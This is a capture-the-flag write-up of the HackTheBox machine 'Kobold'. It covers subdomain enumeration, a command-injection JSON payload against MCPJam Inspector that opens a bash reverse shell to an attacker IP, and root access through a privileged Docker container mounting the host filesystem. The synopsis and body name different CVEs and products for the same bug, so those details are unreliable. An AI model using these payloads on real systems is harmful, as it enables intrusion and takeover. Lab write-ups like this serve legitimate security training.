## Synopsis

**Kobold** is an easy-difficulty Linux machine on HackTheBox featuring a multi-service web application behind nginx with HTTPS and wildcard virtual hosting. The machine exposes multiple subdomains, each running a different application, including a **Kobold Operations Suite** dashboard, an **MCPJam Inspector**, and a **PrivateBin** instance. Initial access is achieved by exploiting an unauthenticated command injection vulnerability (CVE-2026-23520) in the Arcane MCP Server through the `/api/mcp/connect` endpoint, obtaining a shell as user `ben`. Privilege escalation is accomplished by abusing **Docker group** membership, mounting the host filesystem inside a privileged container to gain root access.

## Skills Required

- Web enumeration and subdomain discovery (Virtual Host Fuzzing)
- Understanding of APIs and HTTP endpoints
- Basic Docker knowledge

## Skills Learned

- Subdomain enumeration and fuzzing with wildcard SSL certificates
- Exploiting unauthenticated command injection in Arcane MCP Server (CVE-2026-23520)
- Obtaining and stabilizing a reverse shell
- Linux group membership enumeration
- Privilege escalation via Docker container escape (docker group abuse)

## Enumeration
Starting to enumerate the box with the `nmap` tool.

```shell
sudo nmap -p- --open --min-rate 5000 -sS -Pn -sCV -n --disable-arp-ping --source-port 53 -oA target $ip
```

![Enumeration Nmap](writeups/htb/src/kobold/Kobold_enumeration_nmap_scan_vuln.png)

Nmap detects four open TCP ports:

| Port | Service | Version               | Notes                                                       |
| ---- | ------- | ---------------------- | ------------------------------------------------------------ |
| 22   | SSH     | OpenSSH 9.6p1 Ubuntu   | Latest version, no known CVEs                                |
| 80   | HTTP    | nginx 1.24.0           | Redirects → https://kobold.htb                               |
| 443  | HTTPS   | nginx 1.24.0           | SSL, title: "Kobold Operations Suite"                        |
| 3552 | HTTP    | -                       | Nmap didn't recognize it, but the fingerprint contains HTML  |

At this stage, SSH is useless without credentials. Port 80 simply redirects to HTTPS. However, ports 443 and 3552 are our primary targets.

An important finding from the NSE scripts: the SSL certificate on port 443 contains a wildcard *.kobold.htb in the Subject Alternative Name. For a penetration tester, this is a clear sign: there are subdomains that need to be enumerated.

### Web application investigation

We open `https://kobold.htb` in the browser and see a static homepage for "Kobold Operations Suite". No backend, no login forms, no interactivity. Basically a dead end.

![Main Page](writeups/htb/src/kobold/Kobold_main_page.png)

Let's move on to port 3552. An important note: `curl -k https://kobold.htb:3552` returns a `wrong version number` error. This means port 3552 runs plain **HTTP**, not HTTPS. It's easy to make this mistake if you're used to everything running over TLS.

```shell
curl -I http://kobold.htb:3552
```

![Port Verify](writeups/htb/src/kobold/Kobold_curl_port_3552.png)

Opening `http://kobold.htb:3552` in the browser:

![Arcade Page](writeups/htb/src/kobold/Kobold_page_on_3552.png)

**Arcane v1.13.0** - Docker admin panel. Login form with username and password fields. At the bottom there's a "View on GitHub" link and the version 1.13.0. We won't be able to access it without credentials, so remember them and move on.

### Finding subdomains

The wildcard in the SSL certificate clearly indicates the existence of subdomains. We use ffuf for virtual host enumeration:

```shell
ffuf -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -u https://kobold.htb -H "Host: FUZZ.kobold.htb" -k -fs 154
```

![Ffuz](writeups/htb/src/kobold/Kobold_ffuf_search_subdomain.png)

### MCPJam Inspector - Entry point

When accessing the first subdomain and checking what was running on it, I saw that **PrivateBin 2.0.2** was running, a self-hosted pastebin service with client-side encryption. This version is vulnerable to LFI ([CVE-2025-64714](https://github.com/advisories/GHSA-g2j9-g8r5-rg82), affecting versions 1.7.7–2.0.2). However, to exploit it, we need the ability to write a PHP file to the container's filesystem. I didn't understand how the PoC worked.

![First Subdomain](writeups/htb/src/kobold/Kobold_bin_subdomain.png)

Opening `https://mcp.kobold.htb`:

![Second Subdomain](writeups/htb/src/kobold/Kobold_mcp_subdomain.png)

**MCPJam Inspector v1.4.2** is a development platform for MCP servers. A full dashboard is available without any authentication needed: Servers, Chat, App Builder, Tools, Resources, Settings — everything is accessible. In Settings, you can see the connected Ollama instance and the version `v1.4.2`.

For those unfamiliar with the AI landscape: **the Model Context Protocol (MCP)** is a standard for connecting AI models with external tools. MCPJam Inspector is a development tool for testing MCP servers. And these kinds of tools are increasingly being used in production environments without authentication.

### Vulnerability: GHSA-232v-j27c-5pp6

MCPJam Inspector versions ≤1.4.2 contain a critical remote code execution (RCE) vulnerability, [CVE-2026-23744](https://github.com/advisories/GHSA-232v-j27c-5pp6).

![CVE 2026-23744](writeups/htb/src/kobold/Kobold_firt_cve.png)

The problem is twofold:

1. By default, the Inspector listens on `0.0.0.0` instead of `127.0.0.1`; all HTTP APIs are accessible from the outside.
2. The `/api/mcp/connect` endpoint is designed to connect to MCP servers and accepts a `serverConfig.command` parameter: an arbitrary command to execute. It requires no authentication or validation.

```json
{
    "serverId": "pwn",
    "serverConfig": {
        "timeout": 10000,
        "command": "bash",
        "args": [
            "-c",
            "bash -i >& /dev/tcp/<YOUR_IP>/<PORT> 0>&1"
        ],
        "env": {}
    }
}
```

Essentially, this is documented functionality that, in the context of an exposed service, turns into remote code execution (RCE) with a single HTTP request.

### Operation

Start the listener in a separate terminal window:

```shell
nc -lvnp 4444 # or penelope
```

![CVE Exploit](writeups/htb/src/kobold/Kobold_exploit_rev_shell.png)

## Foothold
After completing the enumeration phase and gaining access to the server, I confirmed that we obtained system access as the user **ben**. With this, I achieved the first exploitation step to compromise the server and obtain the first flag.

![User Flag](writeups/htb/src/kobold/Kobold_first_flag.png)

After a bit of internal enumeration, I gathered information about the compromised user and the system. With `id` I confirmed we had access as `ben` and that he belonged to the `operator` group. I then checked the system groups and noticed that user `alice` was a member of the `docker` group — an interesting piece of information, since this group is often a possible path for privilege escalation. Next, I checked which users had system access to identify potential targets during the post-exploitation phase.

```shell
id
cat /etc/group | grep docker
cat /etc/passwd | grep -v nologin | grep -v false 
```

![Enumeration User](writeups/htb/src/kobold/Kobold_enum_user.png)

### Internal services

Recalling that during initial enumeration there were several open ports, I checked whether there were services accessible only from localhost. I found that ports $8080$ (PrivateBin in Docker) and $6274$ (MCPJam) were only listening on `127.0.0.1`.

```shell
ss -tlnp
ps aux | grep 8080
```

![Local Ports](writeups/htb/src/kobold/Kobold_enum_ports.png)

| Address   | Port    | Service                        |
| --------- | ------- | ------------------------------- |
| 127.0.0.1 | 8080    | Docker container (PrivateBin)   |
| 127.0.0.1 | 6274    | MCPJam Inspector                |
| 0.0.0.0   | 443/80  | nginx                            |
| *         | 3552    | Arcane                           |

Port $8080$ only listens on localhost; it wasn't visible during the external scan.

## Privilege Escalation

After many failed attempts, I ended up going with the Docker route. There was probably another way to escalate privileges, since earlier we had found a vulnerability I couldn't fully understand. To continue, I switched my effective group to `docker`, since up to that point I was using the `operator` group, and also reviewed the images.

```shell
newgrp docker
id
docker images
```

![Add Docker Group](writeups/htb/src/kobold/Kobold_change_group.png)

My first idea was to use a privileged container to mount the host filesystem and gain access to the system with the following command:

```shell
docker run --rm -it --privileged --entrypoint sh -v /:/hostfs privatebin/nginx-fpm-alpine:2.0.2
```

However, the attempt failed because Docker was configured with _User Namespace Remapping_. This security feature maps the container's `root` user to an unprivileged user on the host, preventing a privileged container from having real access to the host system. Because of this, this escalation technique didn't work and it was necessary to look for an alternative.

![Mount System Docker](writeups/htb/src/kobold/Kobold_mount_system_docker.png)

Since the first attempt didn't work due to the _User Namespace Remapping_ configuration, I chose to use a `MySQL` image instead, since it allowed mounting the host filesystem without being affected by that restriction. To do this we ran the following command:

```shell
docker run --rm -it --privileged -v /:/hostfs mysql:latest sh
```

With this command we started a privileged container mounting the root of the filesystem (`/`) inside the `/hostfs` directory, which allowed us to access the host's filesystem from the container and continue with the privilege escalation.

![Privilege Scalation](writeups/htb/src/kobold/Kobold_privilege_scalation.png)

With this, we now have access as `root`, which allows us to read the admin flag and consider the machine complete.

![Root Flag](writeups/htb/src/kobold/Kobold_root_flag.png)